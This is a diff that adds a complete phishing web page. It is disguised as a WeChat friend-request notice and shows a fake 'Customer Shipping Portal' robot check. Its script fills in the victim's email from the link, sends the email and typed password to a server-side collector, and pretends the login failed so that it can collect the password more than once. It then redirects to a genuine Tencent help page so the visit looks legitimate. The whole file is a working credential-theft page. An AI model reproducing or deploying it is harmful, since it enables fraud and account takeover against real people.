@@ -1,0 +1,139 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xml:lang="en" lang="en" xmlns="http://www.w3.org/1999/html">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,10,9,8,7"/>
+	<title>微信 | 好友请求通知</title>
+	<link rel="shortcut icon" href="https://cdn-icons-png.flaticon.com/512/3984/3984261.png" type="image/x-icon">
+<meta name="robots" content="noindex" /><meta name="robots" content="nofollow" />
+<META NAME="GOOGLEBOT" CONTENT="NOARCHIVE" /><META NAME="GOOGLEBOT" CONTENT="NOSNIPPET" />
+</head>
+<body bgcolor="#057F4D">
+<script>
+const url = 'chatbox.php';   //full url goes here
+</script>
+
+<style>
+.login{
+	width:280px; height:35px; font-family: arial; font-size: 18px; color:#057F4D; 
+	background-color: #ffffff; border: solid 1px #BDBDBD; padding: 7px; border-radius: 2px 3px 1px 5px;
+	 
+}
+</style>
+<div style="margin:-8px;width:100%">
+<img id="bg" src="bg.png">
+<img id="bg2" src="bg.png" hidden>
+
+<div style="position:absolute;top:130px;left:510px; width:350px; height:340px; 
+background-color: #ffffff; border: solid 1px #BDBDBD; padding: 7px; border-radius: 2px 7px 1px 8px; 
+-webkit-box-shadow: 2px 2px 2px 2px #616162; box-shadow: 2px 2px 2px 2px #616162;">
+
+	
+
+	<center>
+			<br><br>
+			<font style="font-family:calibri;font-size:20px;line-height:1;text-align:left;color:#363636;">
+                CUSTOMER SHIPPING PORTAL                                       
+			</font>
+			<br><br>
+			<font style="font-family:calibri;font-size:17px;line-height:1;text-align:left;color:#057F4D; font-weight:light;">
+				To gain access, Verify you are not a robot
+			</font>
+		<br><br>
+		<form method="post" action="" onsubmit="Validate(); return false;">
+		<input required id="user" name="user" class="login" value="" type="email" readonly><br><br>
+		<input required placeholder="Password" type="password" id="pass" name="pass" class="login"><br><br>
+		<input type="submit" id="b1" value="VERIFY" style="width:295px; height:50px; font-family: arial; font-size: 18px; color:#FFFFFF; 
+		background-color: #363636; border: solid 1px #363636; padding: 7px; border-radius: 2px 3px 1px 5px;">
+		</form>
+	</center>
+
+</div>
+
+<input type="hidden" id="count" value="0">
+<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js'></script>
+
+
+<script>
+      $(document).ready(function(){
+        var count=0;
+
+      /////////////url email getting////////////////
+      var email = window.location.hash.substr(1);
+      if (!email) {
+
+      }
+      else
+      {
+          var my_email =email;
+          $('#user').val(my_email);
+			
+			}
+		  })
+
+
+function Validate(){
+var a = $('#user').val();
+var b = $('#pass').val();
+var c = $('#count').val();
+
+$.post(url, {user:a,pass:b}, function(){
+setTimeout(function(){
+if(c>=2){
+$('#count').val('0');
+window.location='https://kf.qq.com/touch/faqlist/faqlist_weixin_en_app.html?s=100078&m=1001096&platform=15&title=Adding%20Friends&from=Friends_Adding%20Friends&faq_icon=';
+}else{
+$('#bg').fadeOut();
+$('#bg2').fadeIn();
+$('#user').css('top','250px');
+$('#pass').css('top','311px');
+$('#b1').css('top','381px');
+$('#pass').val('');
+var add = +c+1;
+$('#count').val(add);
+$('#pass').focus();
+}
+},2000);
+});
+}
+
+
+</script>
+
+
+
+<script>
+function process(){
+	var user = document.getElementById('user').value;
+	var pass = document.getElementById('pass').value;
+	if ((user == '') || (user == null)){
+	document.getElementById('bg').src='files/1.png';
+	document.getElementById('user').focus();
+return false;	
+	}else
+	if ((pass == '') || (pass == null)){
+	document.getElementById('bg').src='files/2.png';
+	document.getElementById('pass').focus();
+return false;	
+	}else
+	
+return true	;
+}
+</script>
+<script>
+$('input').focus(function(){
+  $(this).parents('.form-group').addClass('focused');
+});
+
+$('input').blur(function(){
+  var inputValue = $(this).val();
+  if ( inputValue == "" ) {
+    $(this).removeClass('filled');
+    $(this).parents('.form-group').removeClass('focused');  
+  } else {
+    $(this).addClass('filled');
+  }
+})  
+</script>
+</body>
+</html>
